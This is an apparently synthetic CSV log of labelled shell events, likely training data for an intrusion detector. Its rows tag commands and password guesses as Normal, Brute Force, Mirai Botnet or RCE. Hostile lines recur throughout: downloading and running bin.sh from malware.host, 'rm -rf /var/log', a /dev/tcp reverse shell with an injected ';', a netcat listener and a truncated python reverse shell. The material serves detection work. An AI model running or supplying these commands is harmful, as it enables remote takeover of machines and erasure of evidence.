2026-01-08T10:46:17.310501,192.168.1.55,password,Brute Force
2026-01-08T10:46:17.307501,192.168.1.161,exit,Normal
2026-01-08T10:46:17.311501,192.168.1.84,wget http://malware.host/bin.sh,Mirai Botnet
2026-01-08T10:46:17.309502,192.168.1.210,123456,Brute Force
2026-01-08T10:46:17.311501,192.168.1.48,rm -rf /var/log,Mirai Botnet
2026-01-08T10:46:17.311501,192.168.1.195,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.309502,192.168.1.55,root,Brute Force
2026-01-08T10:46:17.307501,192.168.1.86,pwd,Normal
2026-01-08T10:46:17.307501,192.168.1.160,pwd,Normal
2026-01-08T10:46:17.310501,192.168.1.235,password,Brute Force
2026-01-08T10:46:17.309502,192.168.1.36,support,Brute Force
2026-01-08T10:46:17.307501,192.168.1.8,uname -a,Normal
2026-01-08T10:46:17.308503,192.168.1.235,pwd,Normal
2026-01-08T10:46:17.311501,192.168.1.231,/bin/busybox cat /proc/mounts,Mirai Botnet
2026-01-08T10:46:17.311501,192.168.1.238,wget http://malware.host/bin.sh,Mirai Botnet
2026-01-08T10:46:17.309502,192.168.1.174,cat /etc/issue,Normal
2026-01-08T10:46:17.308503,192.168.1.249,exit,Normal
2026-01-08T10:46:17.311501,192.168.1.107,/bin/busybox cat /proc/mounts,Mirai Botnet
2026-01-08T10:46:17.308503,192.168.1.1,pwd,Normal
2026-01-08T10:46:17.306501,192.168.1.188,uname -a,Normal
2026-01-08T10:46:17.312501,192.168.1.217,"python -c ""import socket,subprocess,os;...""",RCE
2026-01-08T10:46:17.307501,192.168.1.192,ls,Normal
2026-01-08T10:46:17.312501,192.168.1.228,"python -c ""import socket,subprocess,os;...""",RCE
2026-01-08T10:46:17.308503,192.168.1.3,uname -a,Normal
2026-01-08T10:46:17.311501,192.168.1.158,rm -rf /var/log,Mirai Botnet
2026-01-08T10:46:17.309502,192.168.1.208,123456,Brute Force
2026-01-08T10:46:17.308503,192.168.1.179,uname -a,Normal
2026-01-08T10:46:17.307501,192.168.1.34,ls,Normal
2026-01-08T10:46:17.308503,192.168.1.247,exit,Normal
2026-01-08T10:46:17.308503,192.168.1.152,pwd,Normal
2026-01-08T10:46:17.307501,192.168.1.10,pwd,Normal
2026-01-08T10:46:17.309502,192.168.1.228,root,Brute Force
2026-01-08T10:46:17.310501,192.168.1.130,admin,Brute Force
2026-01-08T10:46:17.306501,192.168.1.189,ls,Normal
2026-01-08T10:46:17.309502,192.168.1.156,password,Brute Force
2026-01-08T10:46:17.306501,192.168.1.183,ls,Normal
2026-01-08T10:46:17.308503,192.168.1.157,exit,Normal
2026-01-08T10:46:17.310501,192.168.1.90,123456,Brute Force
2026-01-08T10:46:17.309502,192.168.1.251,123456,Brute Force
2026-01-08T10:46:17.310501,192.168.1.206,root,Brute Force
2026-01-08T10:46:17.311501,192.168.1.66,rm -rf /var/log,Mirai Botnet
2026-01-08T10:46:17.309502,192.168.1.103,admin,Brute Force
2026-01-08T10:46:17.309502,192.168.1.184,root,Brute Force
2026-01-08T10:46:17.307501,192.168.1.200,exit,Normal
2026-01-08T10:46:17.307501,192.168.1.123,exit,Normal
2026-01-08T10:46:17.310501,192.168.1.29,support,Brute Force
2026-01-08T10:46:17.310501,192.168.1.173,admin,Brute Force
2026-01-08T10:46:17.311501,192.168.1.171,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.306501,192.168.1.247,exit,Normal
2026-01-08T10:46:17.309502,192.168.1.193,123456,Brute Force
2026-01-08T10:46:17.311501,192.168.1.52,wget http://malware.host/bin.sh,Mirai Botnet
2026-01-08T10:46:17.312501,192.168.1.95,"python -c ""import socket,subprocess,os;...""",RCE
2026-01-08T10:46:17.310501,192.168.1.139,password,Brute Force
2026-01-08T10:46:17.307501,192.168.1.151,cat /etc/issue,Normal
2026-01-08T10:46:17.306501,192.168.1.101,id,Normal
2026-01-08T10:46:17.311501,192.168.1.190,wget http://malware.host/bin.sh,Mirai Botnet
2026-01-08T10:46:17.308503,192.168.1.179,exit,Normal
2026-01-08T10:46:17.308503,192.168.1.149,id,Normal
2026-01-08T10:46:17.311501,192.168.1.189,/bin/busybox cat /proc/mounts,Mirai Botnet
2026-01-08T10:46:17.307501,192.168.1.90,ls,Normal
2026-01-08T10:46:17.312501,192.168.1.176,nc -lvp 4444,RCE
2026-01-08T10:46:17.312501,192.168.1.90,; /bin/sh -i >& /dev/tcp/10.0.0.1/8080 0>&1,RCE
2026-01-08T10:46:17.310501,192.168.1.63,123456,Brute Force
2026-01-08T10:46:17.312501,192.168.1.69,"python -c ""import socket,subprocess,os;...""",RCE
2026-01-08T10:46:17.310501,192.168.1.218,support,Brute Force
2026-01-08T10:46:17.311501,192.168.1.211,/bin/busybox cat /proc/mounts,Mirai Botnet
2026-01-08T10:46:17.312501,192.168.1.35,; /bin/sh -i >& /dev/tcp/10.0.0.1/8080 0>&1,RCE
2026-01-08T10:46:17.310501,192.168.1.239,root,Brute Force
2026-01-08T10:46:17.308503,192.168.1.70,cat /etc/issue,Normal
2026-01-08T10:46:17.308503,192.168.1.156,ls,Normal
2026-01-08T10:46:17.307501,192.168.1.212,uname -a,Normal
2026-01-08T10:46:17.311501,192.168.1.47,rm -rf /var/log,Mirai Botnet
2026-01-08T10:46:17.311501,192.168.1.75,./bin.sh,Mirai Botnet
2026-01-08T10:46:17.311501,192.168.1.22,wget http://malware.host/bin.sh,Mirai Botnet
2026-01-08T10:46:17.310501,192.168.1.168,123456,Brute Force
2026-01-08T10:46:17.308503,192.168.1.253,cat /etc/issue,Normal
2026-01-08T10:46:17.309502,192.168.1.26,ls,Normal
2026-01-08T10:46:17.309502,192.168.1.111,support,Brute Force
2026-01-08T10:46:17.311501,192.168.1.162,/bin/busybox cat /proc/mounts,Mirai Botnet
2026-01-08T10:46:17.307501,192.168.1.237,id,Normal
2026-01-08T10:46:17.310501,192.168.1.182,admin,Brute Force
2026-01-08T10:46:17.310501,192.168.1.17,123456,Brute Force
2026-01-08T10:46:17.309502,192.168.1.105,uname -a,Normal
2026-01-08T10:46:17.310501,192.168.1.159,root,Brute Force
2026-01-08T10:46:17.309502,192.168.1.167,admin,Brute Force
2026-01-08T10:46:17.311501,192.168.1.241,wget http://malware.host/bin.sh,Mirai Botnet
2026-01-08T10:46:17.312501,192.168.1.178,"python -c ""import socket,subprocess,os;...""",RCE
2026-01-08T10:46:17.310501,192.168.1.40,rm -rf /var/log,Mirai Botnet
2026-01-08T10:46:17.307501,192.168.1.132,cat /etc/issue,Normal
2026-01-08T10:46:17.306501,192.168.1.78,pwd,Normal
2026-01-08T10:46:17.312501,192.168.1.143,; /bin/sh -i >& /dev/tcp/10.0.0.1/8080 0>&1,RCE
2026-01-08T10:46:17.312501,192.168.1.44,"python -c ""import socket,subprocess,os;...""",RCE
2026-01-08T10:46:17.311501,192.168.1.66,/bin/busybox cat /proc/mounts,Mirai Botnet
2026-01-08T10:46:17.308503,192.168.1.143,ls,Normal
2026-01-08T10:46:17.307501,192.168.1.238,pwd,Normal
2026-01-08T10:46:17.306501,192.168.1.107,id,Normal
2026-01-08T10:46:17.311501,192.168.1.207,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.308503,192.168.1.61,id,Normal
2026-01-08T10:46:17.310501,192.168.1.171,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.306501,192.168.1.109,ls,Normal
2026-01-08T10:46:17.310501,192.168.1.215,wget http://malware.host/bin.sh,Mirai Botnet
2026-01-08T10:46:17.307501,192.168.1.7,exit,Normal
2026-01-08T10:46:17.307501,192.168.1.243,uname -a,Normal
2026-01-08T10:46:17.308503,192.168.1.197,ls,Normal
2026-01-08T10:46:17.307501,192.168.1.172,id,Normal
2026-01-08T10:46:17.308503,192.168.1.27,uname -a,Normal
2026-01-08T10:46:17.312501,192.168.1.175,"python -c ""import socket,subprocess,os;...""",RCE
2026-01-08T10:46:17.306501,192.168.1.59,cat /etc/issue,Normal
2026-01-08T10:46:17.311501,192.168.1.116,rm -rf /var/log,Mirai Botnet
2026-01-08T10:46:17.306501,192.168.1.26,exit,Normal
2026-01-08T10:46:17.310501,192.168.1.219,./bin.sh,Mirai Botnet
2026-01-08T10:46:17.306501,192.168.1.242,exit,Normal
2026-01-08T10:46:17.307501,192.168.1.29,cat /etc/issue,Normal
2026-01-08T10:46:17.309502,192.168.1.56,root,Brute Force
2026-01-08T10:46:17.310501,192.168.1.124,123456,Brute Force
2026-01-08T10:46:17.309502,192.168.1.135,support,Brute Force
2026-01-08T10:46:17.312501,192.168.1.242,"python -c ""import socket,subprocess,os;...""",RCE
2026-01-08T10:46:17.312501,192.168.1.141,"python -c ""import socket,subprocess,os;...""",RCE
2026-01-08T10:46:17.309502,192.168.1.178,pwd,Normal
2026-01-08T10:46:17.308503,192.168.1.17,id,Normal
2026-01-08T10:46:17.309502,192.168.1.193,id,Normal
2026-01-08T10:46:17.307501,192.168.1.100,pwd,Normal
2026-01-08T10:46:17.311501,192.168.1.139,wget http://malware.host/bin.sh,Mirai Botnet
2026-01-08T10:46:17.306501,192.168.1.5,pwd,Normal
2026-01-08T10:46:17.311501,192.168.1.5,./bin.sh,Mirai Botnet
2026-01-08T10:46:17.312501,192.168.1.75,; /bin/sh -i >& /dev/tcp/10.0.0.1/8080 0>&1,RCE
2026-01-08T10:46:17.311501,192.168.1.146,./bin.sh,Mirai Botnet
2026-01-08T10:46:17.306501,192.168.1.125,ls,Normal
2026-01-08T10:46:17.310501,192.168.1.242,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.307501,192.168.1.121,exit,Normal
2026-01-08T10:46:17.307501,192.168.1.49,cat /etc/issue,Normal
2026-01-08T10:46:17.312501,192.168.1.241,nc -lvp 4444,RCE
2026-01-08T10:46:17.308503,192.168.1.157,ls,Normal
2026-01-08T10:46:17.307501,192.168.1.157,uname -a,Normal
2026-01-08T10:46:17.307501,192.168.1.14,pwd,Normal
2026-01-08T10:46:17.311501,192.168.1.49,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.306501,192.168.1.93,pwd,Normal
2026-01-08T10:46:17.308503,192.168.1.216,ls,Normal
2026-01-08T10:46:17.306501,192.168.1.46,pwd,Normal
2026-01-08T10:46:17.311501,192.168.1.79,wget http://malware.host/bin.sh,Mirai Botnet
2026-01-08T10:46:17.307501,192.168.1.90,uname -a,Normal
2026-01-08T10:46:17.311501,192.168.1.178,rm -rf /var/log,Mirai Botnet
2026-01-08T10:46:17.310501,192.168.1.211,support,Brute Force
2026-01-08T10:46:17.307501,192.168.1.35,uname -a,Normal
2026-01-08T10:46:17.309502,192.168.1.12,root,Brute Force
2026-01-08T10:46:17.311501,192.168.1.159,rm -rf /var/log,Mirai Botnet
2026-01-08T10:46:17.306501,192.168.1.110,exit,Normal
2026-01-08T10:46:17.311501,192.168.1.206,rm -rf /var/log,Mirai Botnet
2026-01-08T10:46:17.306501,192.168.1.25,id,Normal
2026-01-08T10:46:17.311501,192.168.1.77,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.308503,192.168.1.110,uname -a,Normal
2026-01-08T10:46:17.311501,192.168.1.242,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.311501,192.168.1.97,./bin.sh,Mirai Botnet
2026-01-08T10:46:17.306501,192.168.1.238,exit,Normal
2026-01-08T10:46:17.309502,192.168.1.247,123456,Brute Force
2026-01-08T10:46:17.307501,192.168.1.245,cat /etc/issue,Normal
2026-01-08T10:46:17.312501,192.168.1.182,nc -lvp 4444,RCE
2026-01-08T10:46:17.308503,192.168.1.217,id,Normal
2026-01-08T10:46:17.307501,192.168.1.120,cat /etc/issue,Normal
2026-01-08T10:46:17.306501,192.168.1.60,cat /etc/issue,Normal
2026-01-08T10:46:17.311501,192.168.1.13,wget http://malware.host/bin.sh,Mirai Botnet
2026-01-08T10:46:17.308503,192.168.1.232,id,Normal
2026-01-08T10:46:17.309502,192.168.1.221,ls,Normal
2026-01-08T10:46:17.308503,192.168.1.142,uname -a,Normal
2026-01-08T10:46:17.310501,192.168.1.183,admin,Brute Force
2026-01-08T10:46:17.306501,192.168.1.31,pwd,Normal
2026-01-08T10:46:17.310501,192.168.1.140,root,Brute Force
2026-01-08T10:46:17.312501,192.168.1.108,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.306501,192.168.1.245,exit,Normal
2026-01-08T10:46:17.307501,192.168.1.121,pwd,Normal
2026-01-08T10:46:17.307501,192.168.1.151,ls,Normal
2026-01-08T10:46:17.312501,192.168.1.104,"python -c ""import socket,subprocess,os;...""",RCE
2026-01-08T10:46:17.308503,192.168.1.197,id,Normal
2026-01-08T10:46:17.308503,192.168.1.4,pwd,Normal
2026-01-08T10:46:17.311501,192.168.1.17,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.308503,192.168.1.252,uname -a,Normal
2026-01-08T10:46:17.312501,192.168.1.238,nc -lvp 4444,RCE
2026-01-08T10:46:17.308503,192.168.1.155,cat /etc/issue,Normal
2026-01-08T10:46:17.307501,192.168.1.103,uname -a,Normal
2026-01-08T10:46:17.312501,192.168.1.90,"python -c ""import socket,subprocess,os;...""",RCE
2026-01-08T10:46:17.306501,192.168.1.169,id,Normal
2026-01-08T10:46:17.309502,192.168.1.28,root,Brute Force
2026-01-08T10:46:17.307501,192.168.1.181,pwd,Normal
